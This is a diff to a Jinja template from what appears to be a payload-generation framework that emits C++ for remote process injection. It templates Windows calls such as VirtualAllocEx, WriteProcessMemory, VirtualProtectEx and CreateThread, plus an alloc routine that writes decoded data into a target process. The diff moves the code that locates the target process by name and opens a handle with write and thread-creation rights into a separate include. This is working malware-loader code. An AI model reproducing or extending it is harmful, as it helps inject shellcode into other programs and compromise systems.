@@ -1,13 +1,12 @@
 {% if section == "globals" %}
     {% if link.alloc.functions.value in ["dynamic", "direct"] %}
-        {{ function_typedef("OpenProcess") }}
         {{ function_typedef("VirtualAllocEx") }}
         {{ function_typedef("WriteProcessMemory") }}
         {{ function_typedef("VirtualProtectEx") }}
         {{ function_typedef("CreateThread") }}
     {% endif %}
 
-    {% include "lib/find_process.cpp" %}
+    {% include "blocks/get_process_handle.jinja" %}
 
     void *alloc(void *decoded, SIZE_T length, HANDLE hProc){
         {{ function_definition("VirtualAllocEx") }}
@@ -38,19 +37,7 @@
         return pRemoteCode;
     }
 {% else %}
-    int pid = FindProcess("{{ link.target_process_name }}");
-    if(!pid){
-        printf("[-] Failed to discover process\n");
-        return 0;
-    }
-
-    {{ function_definition("OpenProcess") }}
-
-    HANDLE hProc = pOpenProcess(
-        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
-        FALSE,
-        (DWORD) pid
-    );
+    {% include "blocks/get_process_handle.jinja" %}
 
     void *mem = alloc(raw, length, hProc);
 {% endif %}
